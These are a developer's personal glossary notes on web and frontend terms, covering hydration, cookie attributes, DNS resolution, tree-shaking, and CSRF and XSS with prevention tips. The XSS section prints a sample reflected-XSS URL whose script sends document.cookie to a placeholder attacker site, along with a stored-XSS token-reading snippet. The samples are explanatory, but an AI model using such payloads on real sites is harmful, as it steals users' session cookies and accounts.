# Technical terms

<https://punits.dev/jargon-free-intros/>
<https://thanhle.blog/blog/thuat-ngu-trong-frontend-optimization>

## Transpile

Convert the code so that older browser can also run it.

## Waterfall

The current request need to complete to let other requests continue.

## Serialization

The process whereby an object or data structure is translated into a format suitable for transfer over a network

In JavaScript, for example, you can serialize an object to a JSON string by calling the function JSON.stringify().

## Babel

Enable writing codes with JS features that are not supported by most browser yet. The modern code is transpiled back to vanilla JS so that every environment can understand it.
`babel-loader`: the loader used with Webpack to transpile JS

## Cache

<https://www.youtube.com/watch?v=qVQjGwm_mmw>

## Render tree

- <https://web.dev/howbrowserswork/>

is the combination of The CSSOM and DOM tree created in the parsing HTML step. Render tree is then used to compute the layout of every single element, which is then painted to the screen. 
## Repaint and reflow

- <https://dev.to/gopal1996/understanding-reflow-and-repaint-in-the-browser-1jbg>

`layout or reflow`: When the render tree is created, it does not have a position and size. Calculating these values is called layout or reflow

`repaint`: paint the render tree on the screen

## Bundle

Bundle is the process of combining multiple pieces of JS code into one large file

## Side effect

Side effect is anything that affects something outside the function scope, ex: network request, updating the screen, starting an animation, changing data. They are things happens on the side, not during rendering

## SSH

<https://dev.to/therubberduckiee/explaining-ssh-to-my-uber-driver-38a>

## Event driven

The event-driven is a programming model in which programs respond to external events or user actions

In this type of programming, the program listens for events, and when they occur, it executes some code/function that should run in response to that event.

Event-driven architectures have three key components: event producers, event routers, and event consumers. A producer publishes an event to the router, which filters and pushes the events to consumers.

in Node.js, when it receives requests from users or needs to perform time-consuming tasks like reading files or making network requests, it doesn't wait for each request to finish before handling the next one. It quickly notes down what needs to be done and moves on to the next task. Once the time-consuming tasks are done, Node.js goes back and completes the work for each request one by one, efficiently managing multiple tasks concurrently without getting stuck waiting.

This event-driven asynchronous approach in Node.js allows the program to handle many tasks or requests simultaneously, just like a chef managing and cooking multiple orders at once in a bustling restaurant. It makes Node.js highly responsive and efficient, making it a powerful tool for building fast and scalable applications.

## Non-blocking I/O

<https://www.educative.io/answers/what-is-the-event-driven-non-blocking-i-o-model-in-node-js>

Traditional I/O operations, such as reading from files or making network requests, are often blocked, which stops the program's execution until the operation is completed. In contrast, Node JS employs non-blocking I/O, where the execution of the program continues without waiting for the I/O operation to finish. When the operation is completed, a callback is triggered to handle the result.

## Race condition

Two different requests 'raced' against each other and the result might come in a different order than you expected. <https://beta.reactjs.org/learn/you-mig\ht-not-need-an-effect>

## Stateless and stateful

- Stateless means after the initial request is done, the server-client communication is lost. Server doesn't keep the client's state (like HTTP)
- Stateful keeps the client's state (like Websockets)

## Critical rendering path

<https://web.dev/learn/performance/understanding-the-critical-path> **MUST READ THE POST**

Is the sequence of steps the browser takes before performing the initial render of a webpage:

- Constructing the Document Object Model (DOM) from the HTML.
- Constructing the CSS Object Model (CSSOM) from the CSS.
- Applying any JavaScript that alters the DOM or CSSOM.
- Constructing the render tree from the DOM and CSSOM.
- Perform style and layout operations on the page to see what elements fit where.
- Paint the pixels of the elements in memory.
- Composite the pixels if any of them overlap.
- Physically draw all the resulting pixels to screen.

The browser needs to wait for some critical resources to download before it can complete the initial render. These resources include:

- Part of the HTML.
- Render-blocking CSS in the <head> element.
- Render-blocking JavaScript in the <head> element.

Importantly, for the initial render, the browser will not typically wait for:

- All of the HTML.
- Fonts. Font are not blocking resources but Chrome set them as high priority 
- Images.
- Non-render-blocking JavaScript outside of the `<head>` element (for example, `<script>` elements placed at the end of the HTML).
- Non-render-blocking CSS outside of the `<head>` element, or CSS with a media attribute value that does not apply to the current viewport.

## Prefetch and preload

- Prefetch tells browser that you are gonna need this resource in the future, and browser will load it when it's idle. Usecase: apply when user hovers on a link, it's a very high chance that he will click it so you prefetch this link in advance (like NextJS 13)
- Preload tells browser that this resource is very important, please load it asap. Usecase: apply for important resource in the first render, ex: font, hero image.

## Object reference (reference) in JS

<https://www.aleksandrhovhannisyan.com/blog/javascript-pass-by-reference/#object-references-are-pointers>
'Object references' in JavaScript are really pointers. A pointer is a variable that instead of directly storing a primitive value like an int, bool, float, or char, it stores the memory address where some data lives

## RESTful API:

It is the api that helps client interact with server to exchange information via HTTP methods (GET, POST, PUT, DELETE)

## Hydration (Rehydration)

- <https://3perf.com/talks/react-concurrency/#suspense>
- <https://demystifying-rsc.vercel.app/client-components/>
- <https://www.youtube.com/watch?v=R-BKadZWYnQ&ab_channel=Builder>
- <https://www.youtube.com/watch?v=ZKH3DLT4BKw&ab_channel=AddyOsmani>
- <https://thanhle.blog/blog/server-side-rendering-voi-hydration-lang-phi-tai-nguyen-nhu-the-nao>

Hydration is the process of turning static SSR html into dynamic client-side (CSR) html. 

What exactly it does is to use client-side JavaScript to recover application state and add interactivity to server-rendered HTML (which is static HTML)

When a visitor requests their first URL from your site, the response contains static HTML along with linked JavaScript, CSS, and images. React then takes over and hydrates that HTML. React adds event listeners to the DOM created during HTML parsing, and turns your site into a full React application. Subsequent page requests are DOM updates managed by React.

<https://www.joshwcomeau.com/react/the-perils-of-rehydration/>

React renders every components again and attaching generated event listeners to the already existing DOM. Then it compares the mounted DOM with the DOM nodes already on the page, and tries to fit the two together. If not there will be an error like this: "Expected server HTML to contain a matching <div> inside a <nav>" (only happens on development mode but you are warning because this is bug). This process can also be called *reconciliation*

## Deploying:

the act of taking a website live on a server

## Cookie attributes:

<https://prateeksurana.me/blog/javascript-developer-guide-to-browser-cookies/>

- `httpOnly`: prevent browser (client) from reading any cookies with the cookie API. Cookies are accessible only via server. This helps prevent XSS attacks
- `SameSite`: (<https://andrewlock.net/understanding-samesite-cookies/>)
  - `SameSite=Strict`: The cookie will be sent to the server when the current URL is same as the cookie's domain (first-party) and the request originates from the same domain 
  - `SameSite=Lax` (default): Domain in URL bar equals the cookie's domain (first-party), the link to the request can be from the other sites that point to domain, like you click on the domain on google search result.
- `domain`: tell browser which hosts are allowed to access a cookie, default to the same host that set the cookie. This attribute is used only when the current domain is a subdomain like 'abc.xyz.com'. So the default domain is abc.xyz.com and if your client is hosted on another subdomain, like 'def.xyz.com', the cookies are set in response header but they aren't existed on client site and won't be included in the next request to the server.
- `path`: tell browser which path are allowed to access a cookie. A cookie with the path attribute as Path=/store would only be accessible on the path /store and its subpaths /store/cart, /store/gadgets
- `secure`: A cookie with the Secure attribute is only sent to the server over the secure HTTPS protocol, so the domain of client must be HTTPS. This helps in preventing Man in the Middle attacks by making the cookie inaccessible over unsecured connections

## Tree-shaking

<https://dev.to/dianjuar/importing-modules-in-javascript-are-we-doing-it-right-nc>

Is the term for removing unused code before bundling. This process prevents having dead code in the final bundle and make it lighter

```js
import * as lib from 'amazing-lib'
import { foo } from 'amazing-lib'
```

In both cases all the library content is being imported. The first place is the easiest to spot, all the library's content is being assigned to the variable lib. In the second case, we are still importing all the library, we are just applying destructuring to the library's content to get what we need. Thanks to Tree Shaking all the unused code doesn't end up on our bundles.

**Caveats**

- Some packages that use module systems different than ES6 isn't tree shakable (eg: lodash). In this case, we need to use a technique called `cherry-picking` which require absolute path to the file that contains content we need: `import debounce from "lodash/debounce";`
This can be an issue when using barrel files: <https://github.com/vercel/next.js/issues/12557> <https://renatopozzi.me/articles/your-nextjs-bundle-will-thank-you>

## Prototype chain

The prototype chain is a mechanism that allows objects to inherit properties and methods from other objects. Every object in JavaScript has a built-in property, which is called its prototype (`__proto__`). The prototype is itself an object, so the prototype will have its own prototype, creating a chain called a prototype chain. The chain ends when we reach a prototype that has null for its own prototype. 

## postCSS:

- <https://www.youtube.com/watch?v=Kn2SKUOaoT4>

it's like webpack for CSS. There are variaty of postCSS plugins like minify, compile sass to css... 

## Encode and Encrypt

- Encoding transforms data into another format using a scheme that is publicly available so that it can easily be reversed.
- Encryption transforms data into another format in such a way that only specific individual(s) can reverse the transformation

## Reverse proxy

A reverse proxy is a server that accepts a request from the client, forwards the request to web servers, and returns the results to the client as if the proxy server had processed the request.

A reverse proxy is good for:

- Protecting servers
- Load balancing
- Caching static contents
- Encrypting and decrypting SSL communications

## Nameservers and DNS:

- <https://www.bluehost.com/blog/the-low-down-what-is-a-nameserver-why-it-matters-for-your-website>
- <https://kinsta.com/knowledgebase/what-is-a-nameserver/>
- <https://www.cloudflare.com/learning/dns/what-is-a-dns-server/>

### Concept

`DNS` (Domain Name System) is the system that is used to translate domain names into IP address.

`DNS` is composed of multiple `nameservers`, which can be known as [`DNS server`](https://www.namecheap.com/support/knowledgebase/article.aspx/766/10/what-is-dns-server-name-server/). Nameservers or DNS servers function is to store, organize DNS records and returns IP addresses for a domain to browser. `DNS records` are what contains actual information that browsers need to interact with, like the IP addresses. 

### What happens when you visit a website:

<https://blog.bytebytego.com/p/a-crash-course-in-dns-domain-name?ref=dailydev>
<https://www.youtube.com/watch?v=27r4Bzuj5NQ> (**Must read**)
<https://www.cloudflare.com/learning/dns/what-is-a-dns-server/>
<https://www.cloudflare.com/learning/dns/dns-server-types/#recursive-resolver>

- You type URL like 'example.com' into the address bar and hit enter
- Browser first checks its cache. If no answer, it will check in the cache of OS (which is the host file)
- If it's not there, browser uses DNS to retrieve the domain's nameservers: <https://www.youtube.com/watch?v=72snZctFFtA>
  + *DNS resolver* (also known as a *DNS recursor*) receives the query first. The IP of DNS resolver is set in network settings of you computer, default is your ISP
  + If DNS resolver does not have the answer in the cache, then it will ask *Root nameservers* (.). Root nameservers have the IP of *top-level domain (TLD) nameserver* (.com, .org) and return it to DNS resolver
  + DNS resolver reachs TLD nameserver, TLD nameserver returns the IP of nameserver that contains 'example.', which is domain registrar's nameserver (*authoritative nameserver*)
  + DNS resolver goes to `example.com` namesever and it returns IP of `example.com` to DNS resolver
  + DNS resolver returns IP to browser
- Your browser requests the website content from that IP address
- Your browser retrieves the content and renders it in your browser

After retrieving the correct IP address for a given website, the resolver will then store that information in its cache for a limited amount of time. During this time period, if any other clients send requests for that domain name, the resolver can skip the typical DNS lookup process and simply respond to the client with the IP address saved in the cache.

Once the caching time limit expires, the resolver must retrieve the IP address again, creating a new entry in its cache. This time limit, referred to as the time-to-live (TTL) is set explicitly in the DNS records for each site. Typically the TTL is in the 24-48 hour range. A TTL is necessary because web servers occasionally change their IP addresses, so resolvers cannot serve the same IP from the cache indefinitely.

### Where are your Domain's Nameservers located:

By default, when you register a domain, you will use your domain registra's nameservers, such as Namecheap's nameservers:

`
dns1.registrar-servers.com
dns2.registrar-servers.com
`

However, the best recomandation is to use web hosting's nameserver or third-party nameservers like Cloudflare

The important thing to remember is:

If you change your domain's nameservers away from the default nameservers at your domain registrar, you'll control your domain's DNS records at **your nameserver provider**, **not** your domain registrar

### DNS record types

- `A` Record: points a domain (or subdomain) to an IP address
- `CNAME` Record (Canonical name record): points a domain to another domain. This is used when a site has subdomains, such as shop.myblog.com or donations.myblog.com. These are subdomains of myblog.com. Let’s say that each of these subdomains has a CNAME record containing the value “myblog.com.” Since the DNS is looking for an IP address, when the CNAME record is accessed, a further lookup is carried out at myblog.com (as this is the value contained in the CNAME file). It will then return the IP address stored in myblog.com’s A record. This means that these subdomains are aliases of the main domain, and the canonical name (or true name) of these subdomains is actually 'myblog.com'
- `MX` Record: point email to a particular mail server. Like a CNAME, MX Entries must point to a domain and never point directly to an IP address.

## CSRF and XSS

- <https://www.hacksplaining.com/>
- <https://jerrynsh.com/all-to-know-about-auth-and-cookies/>

### XSS attack

- <https://vercel.com/guides/understanding-xss-attacks>

XSS is a type of attack where an attacker injects his JavaScript that will run on your page and take control

For example, an attacker could input JavaScript into a comment form that doesn't sanitize entries, in order to steal user cookies . When victims load the compromised page, the script executes to give the attacker access to user accounts.
There are two types of XSS attack:

- Stored XSS

Attacker attempts to inject JavaScript through form inputs, where the attacker puts an `alert(localStorage.getItem('your-secret-token'))` into a form then submit. The JS code is saved to DB and will be executed when other users visit the website, including attacker.

- Reflected XSS

Attackers inject JS through URL. Basically, he creates a link with malicious JS code like: `abc.com/?search=<script>window.location='[ATTACKER_SITE]?cookie=' + document.cookie </script>`. Then he put it into an email that will be sent to victim. When the victim clicks on the link, `abc.com` loads, the script is executed first to read the cookie on user's website and then user is redirect to attacker site which implement a log system that can extract the cookie data

As you can see XSS exploit storage (session or local) and cookie that `httpOnly` set to `false`

How to prevent:

- Using cookie with `httpOnly` flag set to true
- Escape dynamic content from database so the malicious script will be escape when rendered on page.

### CSRF attack

<https://zellwk.com/blog/understanding-csrf-attacks/>

Attacker tricks user into submitting a malicious request, execute unwanted actions to a website where they are authenticated

The request must originate from another website, which gives it the name "Cross-Site". This request also impersonates an authenticated user, which gives it the name "Request Forgery".

For example: Attacker send a picture with malicious website URL to user email. This website includes an unwanted request to user bank website, like send attacker money and it is run automatically when the user visit website. Luckily, the user has just logged into bank account which means the cookie is stored in browser. Then he is tricked to visit the malicious website and the unwanted request is made because the cookie is still available.

How to prevent

- Using cookie with `SameSite` flag set to `Lax` or `Strict`

## Artifacts in devops

Pipeline artifact: files that are produced by a step in the pipeline, which can be used as the input for next step)
Build artifact: files that created by build process.